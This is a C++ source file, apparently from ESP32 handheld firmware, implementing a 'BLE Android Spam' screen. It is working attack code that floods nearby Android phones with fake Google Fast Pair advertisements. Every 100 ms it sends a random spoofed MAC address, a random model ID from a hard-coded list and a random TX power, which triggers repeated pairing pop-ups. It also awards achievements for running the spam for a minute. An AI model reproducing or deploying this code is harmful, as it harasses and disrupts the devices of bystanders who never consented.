#include "BLEAndroidSpamScreen.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "core/AchievementManager.h"
#include "screens/ble/BLEDeviceSpamMenuScreen.h"

extern "C" int ble_hs_id_set_rnd(const uint8_t *addr);

// ── Lifecycle ──────────────────────────────────────────────────────────────

BLEAndroidSpamScreen::~BLEAndroidSpamScreen()
{
  _stop();
}

void BLEAndroidSpamScreen::onInit()
{
  int n = Achievement.inc("ble_android_spam_first");
  if (n == 1) Achievement.unlock("ble_android_spam_first");
  _spamStartMs    = millis();
  _spam1minFired  = false;

  NimBLEDevice::init("");
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
  _pAdv = NimBLEDevice::getAdvertising();
  _spam();
}

void BLEAndroidSpamScreen::onUpdate()
{
  if (Uni.Nav->wasPressed()) {
    auto dir = Uni.Nav->readDirection();
    if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) {
      _stop();
      Screen.setScreen(new BLEDeviceSpamMenuScreen());
      return;
    }
  }

  uint32_t now = millis();
  if (!_spam1minFired && now - _spamStartMs >= 60000) {
    _spam1minFired = true;
    int m = Achievement.inc("ble_android_spam_1min");
    if (m == 1) Achievement.unlock("ble_android_spam_1min");
  }
  if (now - _lastSpamMs >= 100) {
    _lastSpamMs = now;
    _spam();
  }
  if (now - _lastDrawMs >= 2000) {
    _lastDrawMs = now;
    _spinIdx    = (_spinIdx + 1) % 4;
    render();
  }
}

void BLEAndroidSpamScreen::onRender()
{
  Sprite sp(&Uni.Lcd);
  sp.createSprite(bodyW(), bodyH());
  sp.fillSprite(TFT_BLACK);
  sp.setTextDatum(MC_DATUM);
  sp.setTextColor(TFT_WHITE, TFT_BLACK);
  String label = String("[") + _spinner[_spinIdx] + "] Spamming...";
  sp.drawString(label.c_str(), bodyW() / 2, bodyH() / 2);
  sp.setTextDatum(BC_DATUM);
  sp.setTextColor(TFT_DARKGREY, TFT_BLACK);
  sp.drawString("BACK / ENTER: Stop", bodyW() / 2, bodyH());
  sp.pushSprite(bodyX(), bodyY());
  sp.deleteSprite();
}

// ── Private ────────────────────────────────────────────────────────────────

void BLEAndroidSpamScreen::_spam()
{
  // Google Fast Pair model IDs (3-byte, from public Fast Pair device registry)
  static constexpr uint32_t kModels[] = {
    0x0001F0, 0x000047, 0x470000, 0x00000A, 0x00000B, 0x00000D, 0x000007, 0x090000,
    0x000048, 0x001000, 0x00B727, 0x01E5CE, 0x0200F0, 0x00F7D4, 0xF00002, 0xF00400,
    0x1E89A7, 0xCD8256, 0x0000F0, 0xF00000, 0x821F66, 0xF52494, 0x718FA4, 0x0002F0,
    0x92BBBD, 0x000006, 0x060000, 0xD446A7, 0x038B91, 0x02F637, 0x02D886,
  };
  static constexpr int kModelCount = sizeof(kModels) / sizeof(kModels[0]);

  if (_pAdv) _pAdv->stop();

  uint8_t addr[6];
  esp_fill_random(addr, 6);
  addr[5] |= 0xC0;
  ble_hs_id_set_rnd(addr);

  const uint32_t model = kModels[random(kModelCount)];
  const int8_t txPow   = (int8_t)(random(120) - 100);

  // Raw AD payload: service UUID + service data + TX power
  uint8_t raw[14] = {
    0x03, 0x03, 0x2C, 0xFE,                           // Complete 16-bit UUIDs: 0xFE2C
    0x06, 0x16, 0x2C, 0xFE,                           // Service Data: UUID 0xFE2C + model
    (uint8_t)((model >> 16) & 0xFF),
    (uint8_t)((model >>  8) & 0xFF),
    (uint8_t)((model >>  0) & 0xFF),
    0x02, 0x0A, (uint8_t)txPow                        // TX Power
  };

  NimBLEAdvertisementData advData;
  advData.setFlags(0x06);
  advData.addData(std::string((char*)raw, 14));

  _pAdv->setAdvertisementData(advData);
  _pAdv->start();
}

void BLEAndroidSpamScreen::_stop()
{
  if (_pAdv) {
    _pAdv->stop();
    _pAdv = nullptr;
  }
  NimBLEDevice::deinit(true);
}